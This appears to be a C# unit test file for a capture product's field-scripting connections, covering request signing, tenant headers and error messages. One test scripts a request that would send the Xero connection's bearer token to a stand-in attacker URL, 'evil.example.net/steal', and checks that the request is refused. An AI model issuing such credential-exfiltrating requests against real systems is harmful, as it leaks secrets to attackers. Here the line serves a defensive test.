using System.Net;
using Capture.Core.Models;
using Capture.Core.Profiles;
using Capture.Core.Scripting;
using Capture.Core.Watch;
using Xunit;

namespace Capture.Scripting.Tests;

public class ScriptConnectionTests
{
    private static readonly ConnectionDefinition Xero = new()
    {
        Name = "Xero",
        Type = ConnectionType.Rest,
        BaseUrl = "https://api.example.com/v2",
        AuthMethod = ConnectionAuthMethod.Bearer,
        Token = "secret-token"
    };

    private static readonly ConnectionDefinition Therefore = new()
    {
        Name = "Therefore",
        Type = ConnectionType.Therefore,
        TenantName = "acme",
        AuthMethod = ConnectionAuthMethod.Basic,
        Username = "user",
        Password = "secret-password"
    };

    private sealed class Settings : IWatchSettingsStore
    {
        public Task<WatchSettings> LoadAsync(CancellationToken cancellationToken = default) =>
            Task.FromResult(new WatchSettings { AllowFieldScripts = true, Connections = [Xero, Therefore] });

        public Task SaveAsync(WatchSettings settings, CancellationToken cancellationToken = default) => Task.CompletedTask;
    }

    private sealed class RecordingHandler(Func<HttpRequestMessage, string> respond) : HttpMessageHandler
    {
        public List<(HttpRequestMessage Request, string? Body)> Requests { get; } = [];

        protected override async Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            Requests.Add((request, request.Content is null ? null : await request.Content.ReadAsStringAsync(cancellationToken)));
            return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(respond(request)) };
        }
    }

    private static ScriptExecutionContext Context(params IndexValue[] values) => new()
    {
        ProfileName = "Test",
        DocumentNumber = 1,
        BatchNumber = 1,
        Timestamp = DateTimeOffset.UtcNow,
        Values = values,
        Document = new ScriptDocumentInfo { FileName = "a.pdf", FileExtension = ".pdf", PageCount = 1, Text = "" }
    };

    private static IndexValue Field(string name, string value = "") => new() { FieldId = Guid.NewGuid(), FieldName = name, Value = value };

    [Fact]
    public async Task A_rest_connection_signs_the_request_relative_to_its_address()
    {
        var handler = new RecordingHandler(_ => """{"PurchaseOrders":[{"Number":"PO-1"}]}""");
        var runner = new RoslynFieldScriptRunner(new Settings(), new HttpClient(handler));
        var context = Context(Field("PO", "PO-1"), Field("Found"));
        var script = new FieldScript
        {
            Source = """
                var response = await Connections["xero"].GetAsync($"PurchaseOrders?number={Fields["PO"].Value}");
                Fields["Found"].Value = response.EnsureSuccess().Json.GetProperty("PurchaseOrders").GetArrayLength().ToString();
                """
        };

        var result = await runner.RunProfileScriptAsync(script, context);

        Assert.True(result.Success, result.ErrorMessage);
        Assert.Equal("1", context.Values[1].Value);
        var request = Assert.Single(handler.Requests).Request;
        Assert.Equal("https://api.example.com/v2/PurchaseOrders?number=PO-1", request.RequestUri!.ToString());
        Assert.Equal("Bearer secret-token", request.Headers.Authorization!.ToString());
    }

    [Fact]
    public async Task A_therefore_connection_posts_to_the_operation_with_tenant_and_sign_in()
    {
        var handler = new RecordingHandler(_ => """{"QueryResult":{"ResultRows":[{"DocNo":5}]}}""");
        var runner = new RoslynFieldScriptRunner(new Settings(), new HttpClient(handler));
        var context = Context(Field("DocNo"));
        var script = new FieldScript
        {
            Source = """
                var rows = (await Connections["Therefore"].PostAsync("ExecuteSingleQuery", new { Query = new { CategoryNo = 8 } }))
                    .Json.GetProperty("QueryResult").GetProperty("ResultRows");
                Fields["DocNo"].Value = rows[0].GetProperty("DocNo").ToString();
                """
        };

        var result = await runner.RunProfileScriptAsync(script, context);

        Assert.True(result.Success, result.ErrorMessage);
        Assert.Equal("5", context.Values[0].Value);
        var (request, body) = Assert.Single(handler.Requests);
        Assert.Equal(HttpMethod.Post, request.Method);
        Assert.Equal("https://acme.thereforeonline.com/theservice/v0001/restun/ExecuteSingleQuery", request.RequestUri!.ToString());
        Assert.Equal("acme", request.Headers.GetValues("TenantName").Single());
        Assert.Equal("Basic", request.Headers.Authorization!.Scheme);
        Assert.Equal("""{"Query":{"CategoryNo":8}}""", body);
    }

    [Fact]
    public async Task A_connection_refuses_to_send_its_sign_in_to_another_server()
    {
        var handler = new RecordingHandler(_ => "{}");
        var runner = new RoslynFieldScriptRunner(new Settings(), new HttpClient(handler));
        var script = new FieldScript { Source = """await Connections["Xero"].GetAsync("https://evil.example.net/steal");""" };

        var result = await runner.RunProfileScriptAsync(script, Context());

        Assert.False(result.Success);
        Assert.Contains("only sends requests to https://api.example.com", result.ErrorMessage);
        Assert.Empty(handler.Requests);
    }

    [Fact]
    public async Task An_unknown_connection_name_says_where_to_add_it()
    {
        var runner = new RoslynFieldScriptRunner(new Settings(), new HttpClient(new RecordingHandler(_ => "{}")));
        var result = await runner.RunProfileScriptAsync(new FieldScript { Source = """await Connections["Nope"].GetAsync("x");""" }, Context());

        Assert.False(result.Success);
        Assert.Contains("No connection named \"Nope\"", result.ErrorMessage);
    }

    [Fact]
    public async Task A_field_expression_can_use_a_connection_too()
    {
        var handler = new RecordingHandler(_ => """{"ok":true}""");
        var runner = new RoslynFieldScriptRunner(new Settings(), new HttpClient(handler));
        var fieldId = Guid.NewGuid();

        var result = await runner.RunFieldExpressionAsync(fieldId,
            """(await Connections["Xero"].GetAsync("status")).Json.GetProperty("ok").GetBoolean() ? "Valid" : "Invalid" """,
            Context(new IndexValue { FieldId = fieldId, FieldName = "Check" }));

        Assert.True(result.Success, result.ErrorMessage);
        Assert.Equal("Valid", result.Value);
    }
}
